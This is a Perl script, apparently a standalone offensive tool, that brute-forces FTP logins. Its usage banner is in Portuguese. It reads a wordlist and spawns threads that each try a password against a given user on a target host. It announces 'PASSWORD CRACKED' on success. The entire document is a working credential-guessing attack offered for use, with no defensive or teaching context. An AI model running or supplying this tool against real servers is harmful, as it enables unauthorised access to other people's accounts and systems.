#!/usr/bin/env perl
 
use strict;
use warnings;
use threads;
use Net::FTP;
use Getopt::Long;
use threads::shared;
use Term::ANSIColor qw(:constants);

sub banner {
    print '
    '.GREEN.'[+]'.RESET.' FTP Brute-force By MMxM

    '.BOLD BLUE.'[*]'.RESET.' Opcoes:

        -u | --user => nome do usuario         [exemplo: admin]
        -h | --host => Alvo            [exemplo: 127.0.0.1]
        -w | --wordlist => Lista de palavras    [exemplo: /tmp/wordlist.txt]
        -t | --threads => Numero de threads    [exemplo: 10]

    '.BOLD BLUE.'[*]'.RESET.' Exemplo de uso:

        perl ftp.pl -u admin -h 127.0.01 -w minha-wordlist.txt -t 10

';
    exit(1);
}

my($wordlist,$thr,$ini,$fin,@threads,$arq,$i,@a);
our($user,$host,@aa);

GetOptions(    'u|user=s'  => \$user,
        'h|host=s' => \$host,
        'w|wordlist=s' => \$wordlist,
        't|threads=i' => \$thr
) || die &banner;

&banner if (not defined($user)) || (not defined($host)) || (not defined($wordlist)) || (not defined($thr));
 

open($arq,"<$wordlist") || die($!);
@a = <$arq>;
close($arq);
@aa = grep { !/^$/ } @a;

print "\n".GREEN.'[+]'.RESET." Iniciando ataque";
print "\n".GREEN.'[+]'.RESET." Host => $host";
print "\n".GREEN.'[+]'.RESET." Usuario => $user";
print "\n".GREEN.'[+]'.RESET." Wordlist => $wordlist";
print "\n".GREEN.'[+]'.RESET." Threads => $thr\n\n";

my $stop :shared = 0;

$ini = 0;
$fin = $thr - 1;

while(1){

    exit if $stop;

    @threads = ();

    for($i=$ini;$i<=$fin;$i++){
        push(@threads,$i);
    }

    foreach(@threads){
        $_ = threads->create(\&ftp);
    }

    foreach(@threads){
        $_->join();
    }

    $ini = $fin + 1;
    $fin = $fin + $thr;

}

sub ftp {

    my $id = threads->tid();

    threads->exit() if $stop;

    $id--;

    if(defined($aa[$id])){
        chomp($aa[$id]);
        print BOLD BLUE .'[*]'. RESET ." Testando => $aa[$id]\n";
        
        my $f = Net::FTP->new($host) || die($!);

        if($f->login($user, $aa[$id])){
            $f->quit;
            print "\n\n\t".GREEN.'[+]'.RESET." PASSWORD CRACKED: $aa[$id]\n\n\n";
            $stop = 1;
        } else {
            $f->quit;
        }

    } else {
        $stop = 1;
    }
}  